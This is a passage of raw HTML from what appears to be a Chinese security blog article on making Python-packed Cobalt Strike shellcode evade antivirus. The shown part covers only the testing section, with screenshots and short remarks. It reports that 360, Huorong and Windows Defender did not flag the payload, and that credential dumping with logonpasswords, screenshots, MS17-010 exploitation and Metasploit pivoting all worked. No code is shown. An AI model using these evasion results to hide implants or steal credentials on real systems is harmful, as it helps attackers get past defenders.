rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="font-size:16px;line-height:36px;;"><strong><span style="box-sizing: border-box;font family: arial, helvetica, sans-serif;">0x08 成果检验</span></strong></span></h2><h3 style="box-sizing: border-box;break-inside: avoid;font-size: 1.5em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.43;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">1、测试环境</span></h3><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">【win10专业版+windows defender】【win7 企业版+360全家桶+火绒】【微步云沙箱】【virustotal.com】<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-cropselx1="0" data-cropselx2="578" data-cropsely1="0" data-cropsely2="274" data-ratio="0.4745222929936306" data-s="300,640" data-type="png" data-w="1884" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/7_mNaDrzPZW3DJyLudfxwFnefRY2SZuQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyuZWDc24hawPFCC5PvpK4KcAmmNaDrzPZW3DJyLudfxwFnefRY2SZuQ/640?wx_fmt=png'" style="width: 578px;height: 274px;"  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><h3 style="box-sizing: border-box;break-inside: avoid;font-size: 1.5em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.43;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">2、静态查杀</span></h3><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.4515625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/8_Hws0kJ593nuVnTVG6a9zNkOXu0u4Aw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyZL7BkFibfNvGUlzwWE9knsMibTHws0kJ593nuVnTVG6a9zNkOXu0u4Aw/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><h3 style="box-sizing: border-box;break-inside: avoid;font-size: 1.5em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.43;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">3、微步云沙箱</span></h3><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.44609375" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/9_LmxicQyFGdhM1r2CBX89tJIuqKmqUg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyH93GBThbeC9eawiabwHoueElPCLmxicQyFGdhM1r2CBX89tJIuqKmqUg/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><h3 style="box-sizing: border-box;break-inside: avoid;font-size: 1.5em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.43;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">4、virustotal</span></h3><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.51484375" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/10_icm2ethWhH3Jx58GXBMXhugJfyHg6Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyy461m39AR5iahGnPltn6PbXhXVEicm2ethWhH3Jx58GXBMXhugJfyHg6Q/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">https://www.virustotal.com/gui/file/b19bdc96af2b885b3f77915761269a640c500b553dd1dd795145d090b9b64042/detection</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">virustotal.com的检测率虽然不太乐观，但是对于国内而言，也能满足日常需求了。</span></p><h3 style="box-sizing: border-box;break-inside: avoid;font-size: 1.5em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.43;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><strong><span style="box-sizing: border-box;font-size:16px;line-height:36px;;font family: arial, helvetica, sans-serif;">5、动态行为检测</span></strong></h3><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">在win7企业版上 360全家桶+火绒全部更新到最新的情况下测试<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-cropselx1="0" data-cropselx2="578" data-cropsely1="0" data-cropsely2="263" data-ratio="0.45625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/11_AHUWUOTOoW5ygUSJluBBn8CicQ8jGw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyiavPPcvE8PiasXWWX3MQMFF7mXeAHUWUOTOoW5ygUSJluBBn8CicQ8jGw/640?wx_fmt=png'" style="width: 578px;height: 264px;"  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.3359375" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/12_LCUyk8qLMkUggvKia6aA1xSg2ziaTQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyy1MY6V1zFeMiaS70LRTal1AbcmlULCUyk8qLMkUggvKia6aA1xSg2ziaTQ/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">Cobalt Strike成功上线，且360+火绒没有任何拦截或者提示的行为<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.54140625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/13_SjebgiactJpKRLPwoKRrichKhI63WQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyybUxibZHdInZTzcwHibianLLDrjysGSjebgiactJpKRLPwoKRrichKhI63WQ/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">当然这都是没用的，接下来看看使用cs的功能时，会怎么样</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">1、logonpasswords<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.27109375" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/14_qYDhIOlZPf0wsNicbBrTzNZibibiaA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyW7RSE00lW9FEvkzLs4VdGG6T7lpRqYDhIOlZPf0wsNicbBrTzNZibibiaA/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.50703125" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/15_QMBYxeyaqM0qOFC5LfcWic0C1xcFGw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyylceFgicSwoM3xSX2w6bRv3gujFQMBYxeyaqM0qOFC5LfcWic0C1xcFGw/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">一切正常，且杀软没有任何拦截与提示</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">2、查看进程列表<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.5421875" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/16_CTibzkVYtUKRMtw7fnFiaetwaICicw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyJtfujx3ib8SACcxiaH4rPiaKBqgoguCTibzkVYtUKRMtw7fnFiaetwaICicw/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">3、屏幕截图<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.5390625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/17_C0ibIMjWhuT31xvZlc40AnW6qrtOdA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyUia9mSKxxBDnKbJIbjK0DN24HgC0ibIMjWhuT31xvZlc40AnW6qrtOdA/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"><strong style="box-sizing: border-box;">当然，这都是些没用的，接下来，来点刺激的。</strong></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">4、ms17010<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.5390625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/18_TL3JVR6NGMXJJ60cswuF8cFew2oznw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyianO8Q5Zw0G3G7IUtgdUC7cAiaTL3JVR6NGMXJJ60cswuF8cFew2oznw/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.5390625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/19_iaEGVlteUILD9fd4WlWL7eJLdMfMqg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyywr9nwotYXzzJzfvo0nNBmZvETiaEGVlteUILD9fd4WlWL7eJLdMfMqg/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">ms17010打得也流畅。且360全家桶+火绒没有任何拦截+提示。</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">5、联动Metasploit<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.5390625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/20_p6aVR9YwCcicAMEenR9z3U4eT3YI7Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyLKFhOfXoqWvjEDk0S1h1gP9WSp6aVR9YwCcicAMEenR9z3U4eT3YI7Q/640?wx_fmt=png'" style="display: inline;"  /></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.6736711990111248" data-s="300,640" data-type="png" data-w="809" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/21_hEicEfkzm4picJF8C46EicBXqWRBNg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyiaAJkKEc6lBdjO6Dux3mzRW8FwKNhEicEfkzm4picJF8C46EicBXqWRBNg/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><img class="rich_pages js_insertlocalimg" data-ratio="0.55625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/22_ficOjeGsnUGpoaJG9u8s0kbfv2ibEw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyycLYDMtWjQaxlFU0S4LF3v0QdgyficOjeGsnUGpoaJG9u8s0kbfv2ibEw/640?wx_fmt=png'" style=""  /><br  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">win10专业版+windows denfender<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/23_YXzicmRDWbFaibKIuoxJuv1PwrnQ6Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyyPUYDkqicuslKVgDhqVArYcvxuREYXzicmRDWbFaibKIuoxJuv1PwrnQ6Q/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">到这儿了才能说，嗯，还阔以。</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">附上一张曾经测试时忘了替换vps的ip之后的事情。。。<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.5390625" data-s="300,640" data-type="png" data-w="1280" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/24_ccrN70jaIp7gKPW7ktIg6OWMb6ZQYg.png" 